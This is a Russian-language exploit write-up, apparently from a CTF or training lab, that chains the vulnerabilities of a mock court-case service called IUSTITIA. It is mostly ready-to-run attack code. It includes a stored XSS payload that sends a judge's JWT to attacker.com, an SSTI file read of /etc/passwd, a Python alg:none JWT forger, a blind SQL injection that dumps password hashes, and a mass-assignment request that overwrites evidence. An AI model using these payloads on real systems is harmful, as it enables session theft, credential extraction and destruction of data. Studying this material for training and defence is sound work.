# Chains for IUSTITIA

Ниже описаны две логических цепочки эксплуатации уязвимостей сервиса.
Каждая цепочка комбинирует несколько уязвимостей для достижения
высокоимпактного результата.

---

## Chain 1: Кража сессии судьи -> вынесение приговора от его имени

**Цель:** от лица гражданина (нулевые привилегии) получить JWT-токен судьи
и вынести приговор по любому делу.

```
[Vuln 1] Stored XSS в тексте заявления
         ↓
[Vuln 9] dangerouslySetInnerHTML - XSS исполняется в браузере судьи
         ↓
         кража document.cookie / localStorage (JWT-токен судьи)
         ↓
[Vuln 3] SSTI - судья под контролем атакующего, используем его токен
         для вынесения приговора с reasoning={{.ReadClassified "/etc/passwd"}}
```

### Шаг 1 - XSS-пейлоад (Vuln 1 + Vuln 9)

Гражданин создаёт дело с пейлоадом в поле `text`, который крадёт токен
из `localStorage` и отправляет на сервер атакующего:

```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"citizen_07","password":"c1t1z3n!"}' | jq -r .token)

PAYLOAD='<img src=x onerror="fetch(`https://attacker.com/steal?t=`+localStorage.getItem(`iustitia_token`))">'

curl -s -X POST http://localhost:8080/api/cases \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"defendant\":\"Цель атаки\",\"crime\":\"test\",\"text\":\"$PAYLOAD\"}"
```

Когда судья открывает дело - `dangerouslySetInnerHTML` в `CaseView.tsx`
исполняет `onerror`, токен летит на `attacker.com`.

### Шаг 2 - SSTI для чтения файлов (Vuln 3)

Используя украденный JWT судьи, атакующий выносит приговор с инъекцией
в шаблон:

```bash
JUDGE_TOKEN="<украденный токен>"

curl -s -X POST "http://localhost:8080/api/cases/c2222222-2222-4222-8222-222222222222/verdict" \
  -H "Authorization: Bearer $JUDGE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"verdict":"guilty","sentence":"25 лет","reasoning":"{{.ReadClassified \"/etc/passwd\"}}"}'
```

**Результат:** полный `/etc/passwd` контейнера embedded в документ приговора.
Атакующий прочитал его через `GET /api/documents/{id}`.

---

## Chain 2: Фальсификация дела через утечку данных + подмена архива

**Цель:** прочитать секретные пометки МТБ (`classified_note`) из дел
и перезаписать их в архиве, уничтожив улики.

```
[Vuln 2] JWT alg:none - получаем токен прокурора без пароля
         ↓
[Vuln 5] Утечка classified_note через GET /cases - читаем секреты МТБ
         ↓
[Vuln 7] SQLi в ORDER BY - извлекаем данные из таблицы users (пароли/роли)
         ↓
[Vuln 4] Mass Assignment PATCH /archive - перезаписываем classified_note,
         уничтожая улики против подсудимого
```

### Шаг 1 - Подделка токена прокурора (Vuln 2)

```python
import base64, json, requests

def b64url(d):
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(',',':')).encode()
    ).rstrip(b'=').decode()

# UUID прокурора известен из seed или угадывается перебором
header  = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({
    "user_id": "22222222-2222-4222-8222-222222222222",
    "role": "prosecutor",
    "exp": 9999999999
})
token = f"{header}.{payload}."
```

### Шаг 2 - Читаем classified_note всех дел (Vuln 5)

```bash
curl -s http://localhost:8080/api/cases \
  -H "Authorization: Bearer $TOKEN" \
  | jq '[.[] | {seq_num, defendant, classified_note}]'
```

Получаем все секретные пометки МТБ типа:
`SECRET_MARKER_J: kira-protocol, death-note artifact, 1247 confirmed kills`

### Шаг 3 - SQLi для дампа таблицы users (Vuln 7)

Boolean-blind через ORDER BY извлекаем password_hash пользователей:

```bash
# Проверяем: первый символ хеша судьи - '$'?
curl -s -X POST http://localhost:8080/api/cases/search \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "q": "",
    "order_by": "defendant,(SELECT CASE WHEN substr((SELECT password FROM users WHERE role='\''judge'\'' LIMIT 1),1,1)='\''$'\'' THEN defendant ELSE crime END)",
    "direction": "asc"
  }'
# Порядок сортировки меняется -> бит получен
```

### Шаг 4 - Перезапись улик в архиве (Vuln 4)

Получив токен судьи (через XSS или JWT forgery), перезаписываем
`classified_note` в archive-записи дела:

```bash
JUDGE_TOKEN="<токен судьи>"

# Получаем ID архивной записи
ARCHIVE_ID=$(curl -s http://localhost:8080/api/archive \
  -H "Authorization: Bearer $JUDGE_TOKEN" \
  | jq -r '.[0].id')

# Затираем улики
curl -s -X PATCH "http://localhost:8080/api/archive/$ARCHIVE_ID" \
  -H "Authorization: Bearer $JUDGE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"classified_note": "Дело закрыто. Улики уничтожены."}'
```

**Результат:** архивная запись дела больше не содержит оригинальных данных
МТБ - доказательная база уничтожена.

---

## Итоговая карта цепочек

```
citizen (нулевые права)
    │
    ├─[V1+V9]──→ XSS в браузере судьи/прокурора
    │                │
    │                └──→ кража JWT
    │                         │
    │                         └─[V3]──→ LFI: чтение /etc/passwd, /etc/hostname
    │
    └─[V2]─────→ JWT forgery (alg:none) → любая роль
                     │
                     ├─[V5]──→ утечка classified_note всех дел
                     │
                     ├─[V7]──→ SQLi → дамп users
                     │
                     └─[V4]──→ перезапись archived classified_note
```

---

## Authors

`dave` & `o1d_bu7_go1d`
